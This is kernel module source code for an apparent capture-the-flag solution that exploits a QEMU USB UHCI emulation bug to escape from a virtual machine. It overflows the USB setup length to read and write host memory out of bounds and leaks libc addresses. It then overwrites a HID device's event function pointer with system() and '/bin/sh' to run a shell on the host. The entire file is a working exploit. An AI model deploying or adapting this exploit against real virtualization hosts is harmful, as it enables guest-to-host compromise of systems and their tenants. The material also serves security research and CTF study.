#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/in.h>
#include <linux/slab.h>
#include <linux/delay.h>
#include <linux/string.h>
MODULE_LICENSE("GPL");
MODULE_AUTHOR("sampriti");
MODULE_DESCRIPTION("qemu cve");

#define PORTSC_PRESET       (1 << 8)     // Port Reset
#define PORTSC_PED          (1 << 2)     // Port Enable/Disable
#define USBCMD_RUNSTOP      (1 << 0)
#define USBCMD_PSE          (1 << 4)
#define USB_DIR_OUT			0
#define USB_DIR_IN			0x80
#define QTD_TOKEN_ACTIVE    (1 << 7)
#define USB_TOKEN_SETUP     0x2d
#define USB_TOKEN_IN        0x69 /* device -> host */
#define USB_TOKEN_OUT       0xe1 /* host -> device */
#define QTD_TOKEN_TBYTES_SH 16
#define QTD_TOKEN_PID_SH    8

typedef struct USBEndpoint USBEndpoint;
typedef struct USBDevice USBDevice;

typedef struct UHCI_TD {
    uint32_t link;
    uint32_t ctrl; /* see TD_CTRL_xxx */
    uint32_t token;
    uint32_t buffer;
} UHCI_TD;

uint32_t port_base = 0xc040;
void *dmabuf = NULL;
void *frame_base = NULL;
UHCI_TD *td = NULL;
char *data_buf = NULL;
uint32_t phy_td = 0;

uint16_t pmio_read(uint32_t addr) {
    return (uint16_t)inw(addr + port_base);
}

void pmio_write(uint32_t addr, uint16_t val) {
    outw(val, addr + port_base);
}

void die(char *msg) {
    printk(msg);
}

void init(void) {
    dmabuf = kmalloc(0x3000, GFP_DMA | GFP_ATOMIC);
    if(dmabuf == NULL) {
        die("malloc dmabuf failed\n");
    }

    printk(KERN_ALERT"dmi buffer addr: %p\n", (void *)virt_to_phys(dmabuf));
    td = dmabuf + 0x100;
    frame_base = dmabuf + 0x1000;
    data_buf = dmabuf + 0x2000;
}

//the max of iov_size is 0x7fe
void set_td(uint16_t iov_size, uint8_t option) {
    int i;
    td->link = 0;
    td->ctrl = 1 << 23;     // TD_CTRL_ACTIVE
    td->token = (iov_size << 21) | option;
    td->buffer = virt_to_phys(data_buf);
    phy_td = virt_to_phys(td);
    for(i = 0; i < 1024; i++) {
        *(uint32_t *)((uint32_t *)frame_base + i) = phy_td;
    }
}

void set_frame_base(void) {
    //printk(KERN_INFO"frame_addr %p\n", (void *)virt_to_phys(frame_base));
    //printk(KERN_INFO"write 0x8 port: %lld\n", virt_to_phys(frame_base) & 0xf000);
    pmio_write(0x8, virt_to_phys(frame_base) & 0xf000);
    //printk(KERN_INFO"write 0xa port: %lld\n", (virt_to_phys(frame_base) & 0xffff0000) >> 16);
    pmio_write(0xa, (virt_to_phys(frame_base) & 0xffff0000) >> 16);
}

void reset_uhci(void) {
    // UHCI_CMD_GRESET | UHCI_CMD_HCRESET
    pmio_write(0, 3);
}

void enable_port(void) {
    // UHCI_PORT_EN
    pmio_write(0x10, 0x4);
    pmio_write(0x12, 0x4);
}

void set_length(uint16_t length, uint8_t option) {
    data_buf[0] = option;
    data_buf[7] = length >> 8;
    data_buf[6] = length & 0xff;
}

void do_setup(void) {
    set_td(0x7, USB_TOKEN_SETUP);
    set_length(0x80, USB_DIR_IN);
    reset_uhci();
    enable_port();
    set_frame_base();
    pmio_write(0, 1);       // UHCI_CMD_RS
    mdelay(100);
}

#define USB_TYPE_STANDARD		(0x00 << 5)
#define USB_RECIP_DEVICE		0x00
#define DeviceRequest ((USB_DIR_IN|USB_TYPE_STANDARD|USB_RECIP_DEVICE)<<8)
#define USB_REQ_GET_DESCRIPTOR		0x06

#define USB_DT_DEVICE			0x01

void do_set_length(uint8_t option, uint16_t length) {
    set_td(0x7, USB_TOKEN_SETUP);
    set_length(length, option);
    //reset_uhci();
    //enable_port();
    //set_frame_base();
    pmio_write(0, 1);
    mdelay(100);
}

void do_set_overflow_length(uint8_t option) {
    do_set_length(option, 0xffff);
}

void do_read(uint16_t len) {
    set_td(len - 1, USB_TOKEN_IN);
    //reset_uhci();
    //enable_port();
    //set_frame_base();
    pmio_write(0, 1);
    mdelay(100);
}

void do_write(uint16_t len) {
    set_td(len - 1, USB_TOKEN_OUT);
    //reset_uhci();
    //enable_port();
    //set_frame_base();
    pmio_write(0, 1);
    mdelay(100);
}

uint64_t get_description(void) {
    set_td(0x7, USB_TOKEN_SETUP);
    data_buf[0] = USB_DIR_IN;
    int request = DeviceRequest | USB_REQ_GET_DESCRIPTOR;
    data_buf[0] |= (request >> 8) & 0xff;
    data_buf[1] = request & 0xff;

    data_buf[3] = USB_DT_DEVICE;
    data_buf[2] = 0;

    data_buf[6] = 0x80;
    data_buf[7] = 0;

    //reset_uhci();
    //enable_port();
    //set_frame_base();
    pmio_write(0, 1);       // UHCI_CMD_RS
    mdelay(100);

    do_read(0x80);

    return *(uint64_t*)&data_buf[8];
}

uint64_t arb_read(uint64_t addr) {
    uint64_t desc;

    do_set_length(USB_DIR_OUT, 0x80);
    do_set_overflow_length(USB_DIR_OUT);

    memset(data_buf, 0, 0x1000);
    do_write(0x7ff);
    do_write(0x7ff);

    // Length Written = 2 + 4 * 4 = 18
    *(int32_t*)&data_buf[2] = 0;
    *(int32_t*)&data_buf[2 + 4] = 0x2;
    *(int32_t*)&data_buf[2 + 8] = 0xffff;
    *(int32_t*)&data_buf[2 + 12] = 5364 - 18;      // offset to description

    do_write(18);

    *(uint64_t*)data_buf = addr;

    do_write(8);

    desc = get_description();
    return desc;
}

#define HID_SET_IDLE     0x210a

struct HIDState {
    char buf[260];
    uint32_t head; /* index into circular queue */
    uint32_t n;
    int kind;
    int32_t protocol;
    uint8_t idle;
    bool idle_pending;
    void *idle_timer;
    void* event;
};

void exploit(void) {
    uint64_t desc;
    // int i;

    init(); //alloc a big dma memory
    do_setup(); //init the s->setup_len to 0x80, in order to set the s->state = SETUP_DATA

    // desc = get_description();
    // printk(KERN_INFO"Desc -> 0x%llx", desc);

    do_set_overflow_length(USB_DIR_IN);

    do_read(0x7ff); do_read(0x7ff);
    do_read(0x7ff);

    uint64_t device_addr = *(uint64_t*)&data_buf[38];
    uint64_t desc_addr = *(uint64_t*)&data_buf[1270];

    printk(KERN_INFO"Device Addr -> 0x%llx", device_addr);
    printk(KERN_INFO"Desc Addr -> 0x%llx", desc_addr);


    // LEAK LIBC BEGIN

    uint64_t g_free = arb_read(device_addr + 8);
    printk(KERN_INFO"gfree -> 0x%llx", g_free);

    uint64_t plt_offset = arb_read(g_free + 5) & 0xffffffffU;
    printk(KERN_INFO"plt offset -> 0x%llx", plt_offset);
    plt_offset = 0x100000000ULL - plt_offset;
    printk(KERN_INFO"plt offset -> 0x%llx", plt_offset);

    uint64_t free_plt = g_free + 9 - plt_offset;
    printk(KERN_INFO"free plt -> 0x%llx", free_plt);

    uint64_t free_plt_2 = arb_read(free_plt + 7) & 0xffffffffU;
    printk(KERN_INFO"free plt 2 -> 0x%llx", free_plt_2);
    uint64_t free_got = arb_read(free_plt + 0xb + free_plt_2);
    printk(KERN_INFO"free got -> 0x%llx", free_got);

    /*
    // Extra steps for my local version, remote qemu didn't need these.
    uint64_t free_plt_3 = arb_read(free_got);
    printk(KERN_INFO"free plt 3 -> 0x%llx", free_plt_3);

    uint64_t free_got_2 = arb_read(free_got + 7)  & 0xffffffffU;;
    printk(KERN_INFO"free got 2 -> 0x%llx", free_got_2);

    uint64_t actual_free_got = arb_read(free_got + 0xb + free_got_2);
    printk(KERN_INFO"actual free got -> 0x%llx", actual_free_got);

    free_got = actual_free_got;
    */

   // LEAK LIBC END


    uint64_t libc_base = free_got - 0x097740;
    uint64_t system = libc_base + 0x4fa60;
    uint64_t bin_sh = libc_base + 0x1abf05;

    printk(KERN_INFO"libc base -> 0x%llx", libc_base);

    // offset to event 0x16fc, offset to arg 0x15dc
    printk(KERN_INFO"event function -> 0x%llx", arb_read(device_addr + 0x17e8));


    // OVERWRITE EVENT FUNCTION

    do_set_length(USB_DIR_OUT, 0x80);
    do_set_overflow_length(USB_DIR_OUT);

    memset(data_buf, 0, 0x1000);
    do_write(0x7ff);
    do_write(0x7ff);

    // Length Written = 2 + 4 * 4 = 18
    *(int32_t*)&data_buf[2] = 0;
    *(int32_t*)&data_buf[2 + 4] = 0x2;
    *(int32_t*)&data_buf[2 + 8] = 0xffff;
    *(int32_t*)&data_buf[2 + 12] = 0x15dc - 18;      // offset to description

    do_write(18);

    struct HIDState pwn_state;
    size_t state_len = 296;
    memset(pwn_state.buf, 0, sizeof(pwn_state.buf));
    pwn_state.head = 0;
    pwn_state.n = 0;
    pwn_state.kind = 0;
    pwn_state.protocol = 0x1;
    pwn_state.idle = 0;
    pwn_state.idle_pending = 0;
    pwn_state.idle_timer = 0;
    pwn_state.event = system;
    strcpy(pwn_state.buf, "/bin/sh");
    memcpy(data_buf, (char*)&pwn_state, state_len);

    do_write(state_len);

    // OVERWRITE EVENT FUNCTION END


#define HID_SET_IDLE     0x210a

    // TRIGGER EVENT BEGIN

    set_td(0x7, USB_TOKEN_SETUP);

    int request = HID_SET_IDLE;
    data_buf[0] = (request >> 8) & 0xff;
    data_buf[1] = request & 0xff;

    // value = 1
    data_buf[3] = 1;
    data_buf[2] = 0;

    data_buf[6] = 0;
    data_buf[7] = 0;

    pmio_write(0, 1);
    mdelay(100);

    set_td(0x7, USB_TOKEN_IN);
    pmio_write(0, 1);
    mdelay(100);

    // TRIGGER EVENT END
}

static int __init uhci_init(void) {
    exploit();
    return 1;
}

static void __exit uhci_exit(void) {
    exploit();
}

module_init(uhci_init);
module_exit(uhci_exit);

// rwctf{TrustMeIt_is_the_BEST}
